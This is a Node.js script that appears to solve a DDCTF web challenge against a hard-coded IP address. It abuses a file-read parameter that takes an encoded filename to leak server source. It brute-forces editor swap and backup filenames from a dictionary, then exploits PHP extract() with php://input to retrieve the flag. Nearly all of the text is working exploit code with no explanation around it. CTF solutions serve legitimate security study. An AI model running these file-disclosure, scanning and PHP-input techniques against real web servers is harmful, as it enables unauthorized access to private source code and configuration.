const fs = require('fs')
const path = require('path')
const got = require('got')
const cheerio = require('cheerio')
const flatten = require('just-flatten-it')
const pAll = require('p-all')
const Gauge = require('gauge')
const { base64 } = require('../common/utils')

const FETCH_CONCURRENCY = 5

function decode (input) {
  input = base64.decode(base64.decode(input))
  return Buffer.from(input, 'hex').toString()
}

function encode (input) {
  let hex = Buffer.from(input).toString('hex')
  return base64.encode(base64.encode(hex))
}

async function fetch (filename) {
  const url = `http://117.51.150.246/index.php?jpg=${encode(filename)}`
  const { body } = await got(url, {
    headers: {
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
    },
    retry: 5,
  })
  const matched = body.match(/<\/title>(.*)<\/br>(.*)<\/br>/)
  const request = matched && matched[1]
  const name = matched && matched[2]
  const $ = cheerio.load(body)
  const title = $('title').text()
  const content = base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || '')
  return {
    body,
    title,
    request,
    name,
    content,
  }
}

/**
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3
 */
async function step4 () {
  const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
  const { body } = await got.post(url, {
    body: 'yelo',
  })
  return body
}

async function main () {
  try {
    console.log('Step1: ---')
    console.log((await fetch('index.php')).content)
    console.log('Step2: ---')
    console.log((await scan()))
    console.log('Step3: ---')
    console.log((await fetch('practice.txt.swp')).content)
    console.log('Step4: ---')
    console.log((await fetch('f1agconfigddctf.php')).content)
    console.log('Step5: ---')
    console.log(await step4())
    console.log('Bonus: ---')
    console.log(ascii.decode('436f6e67726174756c6174696f6e73')) // Congratulations
  } catch (error) {
    console.error(`Error: ${error.message}`)
  }
}

/**
 * https://blog.csdn.net/fengbanliuyun/article/details/80913909
 */
async function scan () {
  const getFilenameFunctions = [
    (n) => `${n}.swp`,
    (n) => `.${n}.swp`,
    (n) => `.${n}.swo`,
    (n) => `.${n}.swn`,
    (n) => `${n}.bak`,
    (n) => n,
  ]
  const filenames = fs.readFileSync(path.resolve(__dirname, './dict.txt'), 'utf8')
    .replace(/\r\n/g, '\n')
    .split('\n')
    .filter(Boolean)

  const gauge = new Gauge()

  try {
    let counter = {
      all: 0,
      done: 0,
    }
    const requests = flatten(filenames.map((name) =>
      getFilenameFunctions.map((getFilename) =>
        () => fetch(getFilename(name)).then((response) => {
          gauge.show('Fetch', ++counter.done / counter.all)
          return response
        })
      )
    ))
    counter.all = requests.length
    gauge.show('Fetch')
    const results = await pAll(requests, { concurrency: FETCH_CONCURRENCY })
    const availables = results.filter(({ content }) => content)
    // find out:
    // `practice.txt.swp`: `f1ag!ddctf.php`
    return availables
    } catch (error) {
      console.log(error)
      console.error(`Error: ${error.message}`)
    }
}

// scan()
main()
